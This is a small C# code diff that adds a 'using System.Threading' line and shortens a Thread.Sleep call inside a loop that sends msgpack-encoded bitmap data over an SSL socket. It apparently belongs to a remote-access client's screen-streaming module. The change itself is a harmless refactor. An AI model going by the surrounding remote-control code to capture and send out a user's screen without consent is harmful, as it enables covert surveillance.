@@ -9,6 +9,7 @@ using System;
 using Client.StreamLibrary.UnsafeCodecs;
 using Client.StreamLibrary;
 using System.Runtime.InteropServices;
+using System.Threading;
 
 namespace Client.Handle_Packet
 {
@@ -75,7 +76,7 @@ namespace Client.Handle_Packet
                             tempSocket.SslClient.Write(BitConverter.GetBytes(msgpack.Encode2Bytes().Length));
                             tempSocket.SslClient.Write(msgpack.Encode2Bytes());
                             tempSocket.SslClient.Flush();
-                            System.Threading.Thread.Sleep(1);
+                            Thread.Sleep(1);
                         }
                     }
                     bmp.UnlockBits(bmpData);
